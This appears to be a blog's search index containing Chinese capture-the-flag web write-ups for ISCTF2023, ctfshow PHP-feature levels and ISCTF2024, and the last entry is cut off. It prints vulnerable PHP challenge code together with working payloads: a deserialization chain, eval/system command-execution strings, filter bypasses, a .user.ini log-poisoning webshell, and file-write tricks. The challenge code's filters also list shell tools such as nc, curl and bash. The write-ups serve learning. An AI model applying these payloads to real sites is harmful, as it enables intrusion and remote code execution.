<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>isctf2023web部分wp</title>
      <link href="/2025/03/17/isctf2023web%E9%83%A8%E5%88%86wp/"/>
      <url>/2025/03/17/isctf2023web%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h4 id="圣杯战争-："><a href="#圣杯战争-：" class="headerlink" title="圣杯战争!!!："></a>圣杯战争!!!：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php highlight_file(__FILE__); error_reporting(0); class artifact&#123;   public $excalibuer;   public $arrow;   public function __toString()&#123;     echo &quot;为Saber选择了对的武器!&lt;br&gt;&quot;;     return $this-&gt;excalibuer-&gt;arrow;   &#125; &#125; class prepare&#123;   public $release;   public function __get($key)&#123;     $functioin = $this-&gt;release;     echo &quot;蓄力!咖喱棒！！&lt;br&gt;&quot;;     return $functioin();   &#125; &#125; class saber&#123;   public $weapon;   public function __invoke()&#123;     echo &quot;胜利！&lt;br&gt;&quot;;     include($this-&gt;weapon);   &#125; &#125; class summon&#123;   public $Saber;   public $Rider;   public function __wakeup()&#123;     echo &quot;开始召唤从者！&lt;br&gt;&quot;;     echo $this-&gt;Saber;   &#125; &#125; </span><br></pre></td></tr></table></figure><p>链子：summon-&gt;artifact-&gt;prepare-&gt;saber</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class artifact&#123;</span><br><span class="line">    public $excalibuer;</span><br><span class="line">    public $arrow;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class prepare&#123;</span><br><span class="line">    public $release;</span><br><span class="line">&#125;</span><br><span class="line">class saber&#123;</span><br><span class="line">    public $weapon;</span><br><span class="line">&#125;</span><br><span class="line">class summon&#123;</span><br><span class="line">    public $Saber;</span><br><span class="line">    public $Rider;</span><br><span class="line">&#125;</span><br><span class="line">$a = new summon();</span><br><span class="line">$b = new artifact();</span><br><span class="line">$c = new prepare();</span><br><span class="line">$d = new saber();</span><br><span class="line">$a -&gt; Saber = $b;</span><br><span class="line">$b -&gt; excalibuer = $c;</span><br><span class="line">$c -&gt; release = $d;</span><br><span class="line">$d -&gt; weapon = &quot;php://filter/convert.base64-encode/resource=flag.php&quot;;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure><h4 id="绕进你的心里"><a href="#绕进你的心里" class="headerlink" title="绕进你的心里:"></a>绕进你的心里:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php highlight_file(__FILE__); error_reporting(0); require &#x27;flag.php&#x27;; $str = (String)$_POST[&#x27;pan_gu&#x27;]; $num = $_GET[&#x27;zhurong&#x27;]; $lida1 = $_GET[&#x27;hongmeng&#x27;]; $lida2 = $_GET[&#x27;shennong&#x27;]; if($lida1 !== $lida2 &amp;&amp; md5($lida1) === md5($lida2))&#123;   echo &quot;md5绕过了!&quot;;   if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;     die(&#x27;你干嘛?哎哟!&#x27;);   &#125;   elseif(intval($num))&#123;     if(preg_match(&#x27;/.+?ISCTF/is&#x27;, $str))&#123;       die(&quot;再想想!&quot;);     &#125;     if(stripos($str, &#x27;2023ISCTF&#x27;) === false)&#123;       die(&quot;就差一点点啦!&quot;);     &#125;     echo $flag;   &#125; &#125; ?&gt; </span><br></pre></td></tr></table></figure><p>这个首先是md5绕过，进行数组绕过，然后绕过preg_match函数再进行绕过这个：</p><p>if(preg_match(‘&#x2F;.+?ISCTF&#x2F;is’, $str)){            die(“再想想!”);        }        if(stripos($str, ‘2023ISCTF’) &#x3D;&#x3D;&#x3D; false){            die(“就差一点点啦!”);        }</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;pan[gu&#x27;: &#x27;a&#x27;*1000000 + &#x27;2023ISCTF&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(&#x27;http://gz.imxbt.cn:20215/?hongmeng[]=1&amp;shennong[]=2&amp;zhurong[]=a&#x27;,</span><br><span class="line">                    data=data, allow_redirects=False)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><h4 id="Where-is-the-flag"><a href="#Where-is-the-flag" class="headerlink" title="Where is the flag:"></a>Where is the flag:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php //flag一分为3，散落在各处，分别是：xxxxxxxx、xxxx、xxx。 highlight_file(__FILE__); //标准一句话木马~ eval($_POST[1]); ?&gt;</span><br></pre></td></tr></table></figure><p>简单直接：1&#x3D;system(‘env’); 显示当前的环境变量，没想到直接出来了</p><h4 id="wafr："><a href="#wafr：" class="headerlink" title="wafr："></a>wafr：</h4><p>RCE的题，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php /* Read /flaggggggg.txt */ error_reporting(0); header(&#x27;Content-Type: text/html; charset=utf-8&#x27;); highlight_file(__FILE__); if(preg_match(&quot;/cat|tac|more|less|head|tail|nl|sed|sort|uniq|rev|awk|od|vi|vim/i&quot;, $_POST[&#x27;code&#x27;]))&#123;//strings   die(&quot;想读我文件？大胆。&quot;); &#125; elseif (preg_match(&quot;/\^|\||\~|\\$|\%|jay/i&quot;, $_POST[&#x27;code&#x27;]))&#123;   die(&quot;无字母数字RCE？大胆！&quot;); &#125; elseif (preg_match(&quot;/bash|nc|curl|sess|\&#123;|:|;/i&quot;, $_POST[&#x27;code&#x27;]))&#123;   die(&quot;奇技淫巧？大胆！！&quot;); &#125; elseif (preg_match(&quot;/fl|ag|\.|x/i&quot;, $_POST[&#x27;code&#x27;]))&#123;   die(&quot;大胆！！！&quot;); &#125; else&#123;   assert($_POST[&#x27;code&#x27;]); &#125; </span><br></pre></td></tr></table></figure><p>简单，code&#x3D;system(‘ca\t f*’)%0c</p><h4 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz!:"></a>Fuzz!:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php /* Read /flaggggggg.txt Hint: 你需要学会fuzz，看着键盘一个一个对是没有灵魂的 知识补充：curl命令也可以用来读取文件哦，如curl file:///etc/passwd */ error_reporting(0); header(&#x27;Content-Type: text/html; charset=utf-8&#x27;); highlight_file(__FILE__); $file = &#x27;file:///etc/passwd&#x27;; if(preg_match(&quot;/\`|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\+|\=|\\\\|\&#x27;|\&quot;|\;|\&lt;|\&gt;|\,|\?|jay/i&quot;, $_GET[&#x27;file&#x27;]))&#123;   die(&#x27;你需要fuzz一下哦~&#x27;); &#125; if(!preg_match(&quot;/fi|le|flag/i&quot;, $_GET[&#x27;file&#x27;]))&#123;   $file = $_GET[&#x27;file&#x27;]; &#125; system(&#x27;curl &#x27;.$file); </span><br></pre></td></tr></table></figure><p>新学俩个知识点：[a-z]可以绕过任意一个字母,”|”没过滤可以放在开头结束前面的curl，然后再拼接系统命令</p><p>payload:?file&#x3D;|tac &#x2F;fl[a-z]ggggggg.txt   然后还有一个:?file&#x3D;f{i}l{e}:&#x2F;&#x2F;&#x2F;fla{g}gggggg.txt  进行file:&#x2F;&#x2F;读取文件指在本地系统里面读取文件</p><h4 id="ez-ini"><a href="#ez-ini" class="headerlink" title="ez_ini:"></a>ez_ini:</h4><p>发现是文件上传，进行上传文件传.user.ini.png什么的，然后在bp里面进行改成.user.ini ,</p><p>内容：GIF89a<br>auto_prepend_file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p>在UA头上面传小🐎，然后蚁剑直接连就行了；</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow中php特性上</title>
      <link href="/2025/03/16/ctfshow%E4%B8%ADphp%E7%89%B9%E6%80%A7%E4%B8%8A/"/>
      <url>/2025/03/16/ctfshow%E4%B8%ADphp%E7%89%B9%E6%80%A7%E4%B8%8A/</url>
      
        <content type="html"><![CDATA[<p>PHP特性：</p><p>89:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;   $c = $_GET[&#x27;c&#x27;];   if(!preg_match(&quot;/flag/i&quot;, $c))&#123;     eval($c);   &#125;   &#125;else&#123;   highlight_file(__FILE__); &#125;</span><br></pre></td></tr></table></figure><p>命令执行：?c&#x3D;system(‘tac fl*’);</p><p>90:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;   $num = $_GET[&#x27;num&#x27;];   if($num===&quot;4476&quot;)&#123;     die(&quot;no no no!&quot;);   &#125;   if(intval($num,0)===4476)&#123;     echo $flag;   &#125;else&#123;     echo intval($num,0);   &#125; </span><br></pre></td></tr></table></figure><p>intval:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">intval</span> ( <span class="keyword">mixed</span> <span class="variable">$var</span> [, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span> ] ) : <span class="keyword">int</span></span><br></pre></td></tr></table></figure><p><code>$var</code>：要转换为整数的变量，可以是字符串、浮点数等。</p><p><code>$base</code>：可选参数，指定转换所使用的进制，默认值是 10（十进制）</p><p>intval ($num,0)： 如果 base 是 0，通过检测 var 的格式来决定使用的进制： 如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则， 如果字符串以 “0” 开始，使用 8 进制 (octal)；否则， 将使用 10 进制 (decimal)。</p><p>这个是意思让num!&#x3D;4476,但是intval($num,0)的意思是：<code>if(intval($num,0)===4476)</code> 语句的作用是判断经过 <code>intval</code> 转换后的 <code>$num</code> 的整数值是否严格等于 <code>4476</code> ，如果是，则执行 <code>if</code> 代码块内的语句；如果不是，则跳过 <code>if</code> 代码块内的语句。</p><p>那么就可以进行进制：?num&#x3D;0x117C</p><p>91:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=$_GET[&#x27;cmd&#x27;]; if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123;   if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123;     echo &#x27;hacker&#x27;;   &#125;   else&#123;     echo $flag;   &#125; &#125; else&#123;   echo &#x27;nonononono&#x27;; &#125; </span><br></pre></td></tr></table></figure><p>前面正则是im,但是后面却是i:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i </span><br><span class="line">不区分(ignore)大小写</span><br><span class="line"></span><br><span class="line">m</span><br><span class="line">多(more)行匹配</span><br><span class="line">若存在换行\n并且有开始^或结束$符的情况下，</span><br><span class="line">将以换行为分隔符，逐行进行匹配</span><br><span class="line">$str = &quot;abc\nabc&quot;;</span><br><span class="line">$preg = &quot;/^abc$/m&quot;;</span><br><span class="line">preg_match($preg, $str,$matchs);</span><br><span class="line">这样其实是符合正则表达式的，因为匹配的时候 先是匹配换行符前面的，接着匹配换行符后面的，两个都是abc所以可以通过正则表达式。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>?cmd&#x3D;%0aphp(%0a是换行)</p><p>92：</p><p>和90一样；</p><p>93：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($num==4476)&#123;     die(&quot;no no no!&quot;);   &#125;   if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;     die(&quot;no no no!&quot;);   &#125;   if(intval($num,0)==4476)&#123;     echo $flag;</span><br></pre></td></tr></table></figure><p>过滤了字母但是就是不能使用16进制，但是可以使用8进制：num&#x3D;010574;</p><p>94:</p><p>多过滤了0,就是不能使用8进制，可以使用小数：num&#x3D;4476.0;</p><p>95:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;   $num = $_GET[&#x27;num&#x27;];   if($num==4476)&#123;     die(&quot;no no no!&quot;);   &#125;   if(preg_match(&quot;/[a-z]|\./i&quot;, $num))&#123;     die(&quot;no no no!!&quot;);   &#125;   if(!strpos($num, &quot;0&quot;))&#123;     die(&quot;no no no!!!&quot;);   &#125;   if(intval($num,0)===4476)&#123;     echo $flag;   &#125; </span><br></pre></td></tr></table></figure><p><code>strpos()</code> 是 PHP 中的一个内置函数，用于查找字符串中第一次出现指定子字符串的位置。那么就可以使用：?num&#x3D;%0a010574(0b,0c)都是可以的;</p><p>96：</p><p>(1):直接上php伪协议：u&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>(2)linux:linux下面表示当前目录是 .&#x2F; 所以我们的payload： u&#x3D;.&#x2F;flag.php</p><p>97:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123; if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;]) if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) echo $flag; else print &#x27;Wrong.&#x27;</span><br></pre></td></tr></table></figure><p>这个是md5绕过，在 PHP 中，存在弱类型比较的机制，即使用 <code>==</code> 进行比较时，PHP 会尝试将不同类型的数据转换为合适的类型再进行比较。当对数组使用 <code>md5()</code> 函数时，<code>md5()</code> 函数无法处理数组，会返回 <code>null</code>。</p><p>直接数组绕过：a[]&#x3D;1&amp;b[]&#x3D;2</p><p>98:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include(&quot;flag.php&quot;); $_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;; $_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;; $_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;; highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__); ?&gt; </span><br></pre></td></tr></table></figure><p>首先要看懂三元运算符，其格式为：(expr1) ? (expr2):(expr3)。如果 expr1 为 true，则执行 expr2；否则，执行 expr3。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;</span><br></pre></td></tr></table></figure><p>即判断有没有GET的值传，如果有那么GET传参的值&#x3D;POST传参的值然后：?HTTP_FLAG&#x3D;flag&#x2F;&#x2F;POST:HTTP_FLAG&#x3D;flag</p><p>99:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$allow = array(); for ($i=36; $i &lt; 0x36d; $i++) &#123;   array_push($allow, rand(1,$i)); &#125; if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123;   file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]); &#125; </span><br></pre></td></tr></table></figure><p>首先创建一个名为$allow的数组；然后在这个数组里面使用for循环在数组中添加随机数从1一直到877：第一次:1-36,第二次:1-37依次循环；然后可以在当前目录新建一个文件并且在文件中写入任意的东西但是前提是传入n的值再随机数的数组中存在</p><p>这里说明一下：in_array函数的小问题：<strong>in_array(）此函数一般情况下会把 <code>&quot;1.php&quot;</code> 视为数字 <code>1</code>，2.php同理</strong></p><p>然后就猜1,2,3什么的概率大点：然后在：?n&#x3D;1.php;&#x2F;&#x2F;&#x2F;&#x2F;POST:content&#x3D;<?=system('ls');?>然后就是命令执行了</p><p>100：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(__FILE__); include(&quot;ctfshow.php&quot;); //flag in class ctfshow; $ctfshow = new ctfshow(); $v1=$_GET[&#x27;v1&#x27;]; $v2=$_GET[&#x27;v2&#x27;]; $v3=$_GET[&#x27;v3&#x27;]; $v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); if($v0)&#123;   if(!preg_match(&quot;/\;/&quot;, $v2))&#123;     if(preg_match(&quot;/\;/&quot;, $v3))&#123;       eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);     &#125;   &#125;   &#125;  ?&gt; </span><br></pre></td></tr></table></figure><p>这个首先要知道赋值操作大于and;即只要v1&#x3D;num就行了然后就可以利用eval函数了(RCE)就行了；</p><p>v1&#x3D;1&amp;v2&#x3D;system(‘ls’)&#x2F;<em>&amp;v3&#x3D;</em>&#x2F;;</p><p>101：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$v1=$_GET[&#x27;v1&#x27;]; $v2=$_GET[&#x27;v2&#x27;]; $v3=$_GET[&#x27;v3&#x27;]; $v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); if($v0)&#123;   if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;, $v2))&#123;     if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;, $v3))&#123;       eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);     &#125;   &#125;   &#125; </span><br></pre></td></tr></table></figure><p>这关和web100关的区别是禁用了许多符号这就说明我们无法使用注释来像上一关那样输出ctfshow;</p><p>这里呢需要使用内置函数反射类给他回显出来：</p><ul><li>ReflectionClass：获取类的相关信息，函数、属性、常量等；</li><li>ReflectionMethod：类的相关方法的获取以及调用；</li><li>ReflectionParameter：获取类的函数或者方法参数的相关信息；</li><li>ReflectionProperty：类的相关属性</li></ul><p>然后v1&#x3D;1&amp;v2&#x3D;echo new Reflectionclass&amp;v3&#x3D;;</p><p>102：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$v1 = $_POST[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; $v3 = $_GET[&#x27;v3&#x27;]; $v4 = is_numeric($v2) and is_numeric($v3); if($v4)&#123;   $s = substr($v2,2);   $str = call_user_func($v1,$s);   echo $str;   file_put_contents($v3,$str); &#125; else&#123;   die(&#x27;hacker&#x27;); &#125;  ?&gt; </span><br></pre></td></tr></table></figure><p>substr函数:substr(a,b):返回一部分，从b开始截取 例：$a&#x3D;123456 substr($a,2); 返回：3456</p><p>call_user_func ($callback, parameter)：调用函数，第一个参数为被调用的函数，第二个参数为被调用函数所需的参数</p><p>file_put_contents (filename, data)：把 data 数据写入 filename;</p><p>既然往进写文件那就可以写一个php的一句话木马或者是命令执行那一句话木马如何只作为数字并且经过函数又正常执行呢那一定是16进制和hex2bin但是0x在is_numeric里面过不去；所以可以进行：先base64再16进制：</p><?=`tac *`;(base64之后再转16进制)<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v2=cc504438395948526859794171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php` `post: v1=hex2bin</span><br></pre></td></tr></table></figure>103：就过滤了php,和102一样104：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;   $v1 = $_POST[&#x27;v1&#x27;];   $v2 = $_GET[&#x27;v2&#x27;];   if(sha1($v1)==sha1($v2))&#123;     echo $flag;   &#125; </span><br></pre></td></tr></table></figure>直接数组绕过105：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(__FILE__); include(&#x27;flag.php&#x27;); error_reporting(0); $error=&#x27;你还想要flag嘛？&#x27;; $suces=&#x27;既然你想要那给你吧！&#x27;; foreach($_GET as $key =&gt; $value)&#123;   if($key===&#x27;error&#x27;)&#123;     die(&quot;what are you doing?!&quot;);   &#125;   $$key=$$value; &#125;foreach($_POST as $key =&gt; $value)&#123;   if($value===&#x27;flag&#x27;)&#123;     die(&quot;what are you doing?!&quot;);   &#125;   $$key=$$value; &#125; if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;   die($error); &#125; echo &quot;your are good&quot;.$flag.&quot;\n&quot;; die($suces); ?&gt; </span><br></pre></td></tr></table></figure>变量覆盖：[PHP变量覆盖漏洞解析-CSDN博客](https://blog.csdn.net/weixin_43803070/article/details/91151861)foreach ($_GET as $key => $value)$$key = $$value这个的意思如果你进行GET传参的话：1=flag;那么就是$1=$flag;然后再根据条件:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;   die($error); </span><br></pre></td></tr></table></figure>这个就是检查POST传参里面的键里面是不是有flag的参数；然后它比较 $_POST['flag'] 的值与之前加载的 flag.php 文件中定义的 $flag 变量的值是否相等。如果这两个值不相等（即 !($_POST['flag']==$flag) 为真），则执行die($error); 语句，终止脚本执行，并输出 $error 变量的值作为错误信息；这里利用的是die($error)来实现的输出pyload:GET:?1=flag  POST:error=1;即：$error=$1=$flag;106：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;   $v1 = $_POST[&#x27;v1&#x27;];   $v2 = $_GET[&#x27;v2&#x27;];   if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123;     echo $flag;   &#125; </span><br></pre></td></tr></table></figure>数组绕过；107:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;v1&#x27;]))&#123;   $v1 = $_POST[&#x27;v1&#x27;];   $v3 = $_GET[&#x27;v3&#x27;];    parse_str($v1,$v2);    if($v2[&#x27;flag&#x27;]==md5($v3))&#123;      echo $flag;    &#125; </span><br></pre></td></tr></table></figure>`parse_str` 函数有两种使用方式：1. 当只传入一个参数时，它会把查询字符串解析成变量，并将这些变量注册到当前符号表中。//可以理解是传值2. 当传入两个参数时，它会把查询字符串解析成变量，然后将这些变量作为键值对存储在第二个参数所指定的数组里。先数组绕过?v3[]=1;然后<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($v2[&#x27;flag&#x27;]==md5($v3))&#123;      echo $flag;    &#125; </span><br></pre></td></tr></table></figure>v1=flag108:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;])===FALSE) &#123;   die(&#x27;error&#x27;); &#125; //只有36d的人才能看到flag if(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123;   echo $flag; &#125; </span><br></pre></td></tr></table></figure>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字 母的字符是大小写敏感的。 ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配;?c=a%00778109:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;   $v1 = $_GET[&#x27;v1&#x27;];   $v2 = $_GET[&#x27;v2&#x27;];   if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123;       eval(&quot;echo new $v1($v2());&quot;);   &#125; </span><br></pre></td></tr></table></figure>可以进行和反射类一样或者尝试一下异常类110：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;   $v1 = $_GET[&#x27;v1&#x27;];   $v2 = $_GET[&#x27;v2&#x27;];   if(preg_match(&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v1))&#123;       die(&quot;error v1&quot;);   &#125;   if(preg_match(&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v2))&#123;       die(&quot;error v2&quot;);   &#125;   eval(&quot;echo new $v1($v2());&quot;); </span><br></pre></td></tr></table></figure>考点：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filesystemiterator 遍历文件类(PHP 5 &gt;= 5.3.0, PHP 7, PHP 8)</span><br><span class="line"></span><br><span class="line">DirectoryIterator 遍历目录类</span><br><span class="line"></span><br><span class="line">getcwd()函数 获取当前工作目录 返回当前工作目录</span><br></pre></td></tr></table></figure>然后遍历目录就行，查看到f开头的文件，直接访问就行了111：112：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($file)&#123;</span><br><span class="line">    if(preg_match(&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class="line">        die(&quot;hacker!&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!&quot;;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>is_file函数是检查是不是存在这个文件，如果有echo hacker,否则就高亮显示；直接进行伪协议读取flag113:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function filter($file)&#123;   if(preg_match(&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;     die(&#x27;hacker!&#x27;);   &#125;else&#123;     return $file;   &#125; &#125; $file=$_GET[&#x27;file&#x27;]; if(! is_file($file))&#123;   highlight_file(filter($file)); &#125;else&#123;   echo &quot;hacker!&quot;; &#125;</span><br></pre></td></tr></table></figure>一看的话可能是伪协议；没有过滤封装协议；可以进行：?file=compress.zlib://flag.php114：`function filter($file){   if(preg_match('/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){     die('hacker!');   }else{     return $file;   } } $file=$_GET['file']; echo "师傅们居然tql都是非预期 哼！"; if(! is_file($file)){   highlight_file(filter($file)); }else{   echo "hacker!"; } `师傅们居然tql都是非预期 哼！没有过滤filter;?file=php://filter/resource=flag.php;115:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function filter($num)&#123;   $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num);   $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num);   $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num);   $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num);   $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num);   return $num; &#125; $num=$_GET[&#x27;num&#x27;]; if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27; and filter($num)==&#x27;36&#x27;)&#123;   if($num==&#x27;36&#x27;)&#123;     echo $flag;   &#125;else&#123;     echo &quot;hacker!!&quot;;   &#125; &#125;else&#123;   echo &quot;hacker!!!&quot;;</span><br></pre></td></tr></table></figure>1:进行替换 2：是不是整数 3：不=36 4：trim函数去除俩边空白符，但是没有过滤\f   5:filter(num)=36<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">for ($i = 0; $i &lt; 129; $i++) &#123;</span><br><span class="line">    $num = chr($i) . &#x27;36&#x27;;</span><br><span class="line">    if (trim($num) !== &#x27;36&#x27; &amp;&amp; is_numeric($num) &amp;&amp; $num !== &#x27;36&#x27;) &#123;</span><br><span class="line">        echo urlencode(chr($i)) . &quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>进行测试；?num=%0c36]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>isctf2024web</title>
      <link href="/2025/03/16/isctf2024web/"/>
      <url>/2025/03/16/isctf2024web/</url>
      
        <content type="html"><![CDATA[<h4 id="ISCTF2024："><a href="#ISCTF2024：" class="headerlink" title="ISCTF2024："></a>ISCTF2024：</h4><h4 id="1z-php"><a href="#1z-php" class="headerlink" title="1z_php:"></a>1z_php:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;J&#x27;]))&#123;  $call=$_POST[&#x27;J&#x27;];  $dangerous_commands = [&#x27;cat&#x27;, &#x27;tac&#x27;, &#x27;head&#x27;, &#x27;nl&#x27;, &#x27;more&#x27;, &#x27;less&#x27;, &#x27;tail&#x27;, &#x27;vi&#x27;, &#x27;sed&#x27;, &#x27;od&#x27;];  foreach ($dangerous_commands as $command) &#123;    if (preg_match(&quot;/$command/i&quot;, $call)) &#123;      die(&quot;这些个危险函数可不兴使啊&quot;);    &#125;  &#125;  system($call);&#125;?&gt;</span><br></pre></td></tr></table></figure><p>J&#x3D;ls &#x2F;   J&#x3D;uniq &#x2F;f14g</p><h4 id="25时晓山瑞希生日会"><a href="#25时晓山瑞希生日会" class="headerlink" title="25时晓山瑞希生日会:"></a>25时晓山瑞希生日会:</h4><p>你不是烤p！要是Project Sekai的客户端请求才能加入生日会</p><p>在UA头上面改得到：你似乎没在正确的时间来…，额，时间:伪造data:Date: Thu, 27 Aug 2024 05:00:00 GMT</p><h4 id="ezrce"><a href="#ezrce" class="headerlink" 